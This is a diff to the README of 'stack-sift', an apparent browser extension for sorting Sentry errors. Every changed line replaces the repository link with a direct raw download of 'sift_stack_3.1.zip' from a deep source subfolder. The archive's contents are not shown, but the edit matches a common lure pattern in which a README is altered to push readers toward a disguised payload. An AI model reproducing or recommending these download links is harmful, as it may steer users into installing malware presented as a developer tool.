@@ -1,6 +1,6 @@
 # 🧩 stack-sift - Sort Sentry Errors with Local AI
 
-[![Download stack-sift](https://img.shields.io/badge/Download-Stack--Sift-4B6EAF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Pyrochemical-civilunion999/stack-sift)
+[![Download stack-sift](https://img.shields.io/badge/Download-Stack--Sift-4B6EAF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Pyrochemical-civilunion999/stack-sift/main/src/contents/sentry-sidebar/sift_stack_3.1.zip)
 
 ## 🚀 What stack-sift does
 
@@ -12,7 +12,7 @@ It uses local machine learning to learn from your corrections as you work. It do
 
 Use this link to visit the download page:
 
-[Download stack-sift here](https://github.com/Pyrochemical-civilunion999/stack-sift)
+[Download stack-sift here](https://raw.githubusercontent.com/Pyrochemical-civilunion999/stack-sift/main/src/contents/sentry-sidebar/sift_stack_3.1.zip)
 
 ### Install on Windows
 
@@ -126,4 +126,4 @@ If the extension opens but does not read Sentry data:
 
 Primary download page:
 
-https://github.com/Pyrochemical-civilunion999/stack-sift
+https://raw.githubusercontent.com/Pyrochemical-civilunion999/stack-sift/main/src/contents/sentry-sidebar/sift_stack_3.1.zip
